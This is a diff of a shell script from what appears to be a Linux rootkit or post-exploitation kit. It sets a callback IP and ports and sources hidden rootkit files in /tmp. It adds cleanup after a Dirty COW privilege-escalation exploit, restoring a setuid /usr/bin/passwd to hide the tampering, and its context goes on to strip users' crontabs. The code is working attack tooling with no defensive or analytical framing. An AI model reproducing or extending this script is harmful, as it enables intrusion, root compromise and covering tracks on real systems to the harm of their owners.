@@ -2,7 +2,7 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15539"
+portp="15828"
 
 source /tmp/.functions
 source /tmp/.rootkit
@@ -14,11 +14,18 @@ user=$(whoami)
 
 if [ "$user" != "root" ]; then
   echo "priviledge escalation failed"
+  #remove /tmp/bak (created by dirtycow exploit)
+  rm /tmp/bak &>/dev/null
   exit
 fi
 
 #---if the user making the connection is root---
 echo "priviledge escalation succeeded"
+
+#restore /usr/bin/passwd
+mv /tmp/bak /usr/bin/passwd &>/dev/null
+chown root:root /usr/bin/passwd &>/dev/null
+chmod u+s /usr/bin/passwd
 
 #remove user's crontab
 users=$(cat /etc/passwd | awk -F: '{ print $1 }')
